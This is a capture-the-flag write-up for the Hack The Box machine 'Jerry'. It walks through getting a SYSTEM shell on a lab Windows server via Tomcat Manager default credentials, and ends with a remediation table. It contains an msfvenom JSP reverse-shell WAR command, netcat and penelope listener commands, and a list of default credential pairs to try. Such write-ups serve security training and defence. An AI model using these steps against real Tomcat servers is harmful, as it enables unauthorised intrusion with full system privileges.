# Jerry — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | 🪟 Windows Server 2012 R2 Standard |
| **Difficulty** | 🟢 Easy |
| **Owned** | 27/09/2026 |
| **Author** | Maksym S |

> ⚠️ Retired machine. Flags are redacted (`<redacted>`) in line with the HTB Terms of Service.

---

## 📌 Summary

**Jerry** is the textbook Apache Tomcat box: a single exposed Tomcat instance whose **Manager app
still uses default credentials** (`tomcat:s3cret`). Authenticated Manager access means arbitrary WAR
deployment — deploy a JSP reverse-shell WAR and you land a shell as the Tomcat service account,
which on this box is **`NT AUTHORITY\SYSTEM`** directly. No privilege escalation step: both flags
sit in a single file on the Administrator desktop.

**Attack path:** `Tomcat 7.0.88 (8080) → /manager/html default creds → malicious WAR deploy → SYSTEM`

---

## 🔍 1. Reconnaissance

### Port scan

Only one TCP port is open — Tomcat's default HTTP connector on 8080.

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

UDP (top 100 + `udpx`): no open ports.

---

## 🧭 2. Enumeration

`http-enum` / directory fuzzing against 8080 surfaces the Tomcat Manager, which requires auth:

```
nmap -sV --script "vuln and http*" -p 8080 $IP

| http-enum:
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|_  /docs/: Potentially interesting folder
```

The `401 Unauthorized` on `/manager/html` is the whole box: Tomcat Manager is the deploy interface,
and the only thing between us and code execution is a password.

> The `http-slowloris-check` "LIKELY VULNERABLE" (CVE-2007-6750) is a **DoS** — noise for this box,
> never a foothold. Ignore DoS findings on HTB.

---

## 🎯 3. Foothold — default Manager creds → WAR deploy → SYSTEM

Tomcat Manager on this box accepts the well-known default credential pair **`tomcat:s3cret`** (the
pair shipped in some Tomcat `tomcat-users.xml` examples):

```xml
<user username="tomcat" password="s3cret" roles="manager-gui"/>
```

With `manager-gui` access, the Manager's "WAR file to deploy" upload = arbitrary code execution.
Build a JSP reverse-shell WAR and deploy it:

```bash
# attack box — generate the WAR payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=1337 -f war -o revshell.war

# start the listener (penelope here; nc -lvnp 1337 works too)
penelope -p 1337
```

Upload `revshell.war` via `/manager/html` (Deploy → WAR file to deploy → Deploy), then browse to the
deployed context (`http://$IP:8080/revshell/`) to trigger it. The listener catches a shell as the
Tomcat service account — which is SYSTEM:

```
[+] [New Reverse Shell] => JERRY 10.129.136.9 Microsoft_Windows_Server_2012_R2_Standard-x64-based_PC 👤 nt authority\system

C:\apache-tomcat-7.0.88>whoami
nt authority\system
```

`whoami /all` confirms full SYSTEM with `SeImpersonate`/`SeDebug`/etc. all present — but none of it is
needed, we're already SYSTEM:

```
USER INFORMATION
----------------
User Name           SID
=================== ========
nt authority\system S-1-5-18
```

---

## ⬆️ 4. Privilege Escalation

**None required.** Tomcat runs as `NT AUTHORITY\SYSTEM`, so the foothold *is* the privilege
escalation. This is the whole point of the box: a service that deploys arbitrary code and runs as
SYSTEM collapses foothold and root into a single step.

---

## 🚩 Proof

Both flags are stored in one file on the Administrator desktop — a bit of box humor:

```
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"

user.txt
<redacted>

root.txt
<redacted>
```

```
user.txt: <redacted>
root.txt: <redacted>
```

---

## 🧠 Lessons Learned

- **What worked:** default credentials on an admin/deploy interface. Always try known default
  cred pairs against Tomcat Manager (`tomcat:tomcat`, `tomcat:s3cret`, `admin:admin`, etc.) before
  anything heavier — it's the single most common Tomcat foothold.
- **Any "deploy an app" interface = RCE once authenticated.** Tomcat Manager (WAR), Jenkins (script
  console), and similar admin panels turn a password into code execution. Treat reaching such a
  panel as reaching a shell.
- **Rabbit holes:** the Slowloris DoS finding — never a foothold on HTB/OSCP; ignore DoS results.
- **OSCP takeaway:** when a service runs as SYSTEM/root, foothold and privesc are the same step —
  recognize which services do this (Tomcat as SYSTEM here) so you don't waste time hunting a
  privesc that doesn't exist.

---

## 🛡️ Remediation

| Finding | Severity | Fix |
|---------|:--------:|-----|
| Tomcat Manager default credentials (`tomcat:s3cret`) | Critical | Change/remove default users in `tomcat-users.xml`; use strong unique credentials |
| Manager app reachable and allows WAR deploy | High | Restrict Manager to localhost/trusted IPs (`RemoteAddrValve`); remove Manager if unused |
| Tomcat service running as `NT AUTHORITY\SYSTEM` | High | Run Tomcat under a dedicated low-privilege service account, not SYSTEM |

---

## 🔗 References

- [Apache Tomcat Manager — how to configure & secure](https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html)
- [HackTricks — Tomcat pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
